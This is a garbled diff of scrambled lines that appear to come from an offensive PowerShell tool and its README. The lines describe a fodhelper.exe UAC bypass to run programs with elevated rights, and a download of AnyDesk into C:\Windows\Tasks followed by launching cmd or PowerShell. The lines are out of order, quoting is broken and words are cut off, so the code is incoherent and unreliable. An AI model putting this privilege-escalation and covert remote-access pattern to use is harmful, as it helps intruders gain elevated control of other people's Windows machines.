@@ -1,0 +1,13 @@
+    Bypasses UAC via fodhelper.exe
+ or powersell.exe
+"            ""$InstallPath\AnyDesk.exe"
+"            ""C:\Program Files (x86)\AnyDesk\AnyDesk.exe"
+"            ""C:\Program Files\AnyDesk\AnyDesk.exe"
+"        [String]$program = ""cmd /c start powershell.exe"
+"        [string]$AnyDeskURL = ""https://download.anydesk.com/AnyDesk.exe"
+"        [string]$DestinationPath = ""C:\Windows\Tasks\AnyDesk.exe"
+"    Start-Process ""C:\Windows\System32\fodhelper.exe"
+"C:\Users\Vlex\Desktop> Invoke-FodHelperBypass -program ""calc.exe"
+- **UAC Bypass**: Bypasses UAC via fodhelper.exe
+5. **Bypass UAC to run any program in elevated context. Default program powershell.exe
+t.github.com/netbiosX/a114f8822eb20b115e33db55deee6692 all credit goes to netbiosX :). Spawnning cmd.exe
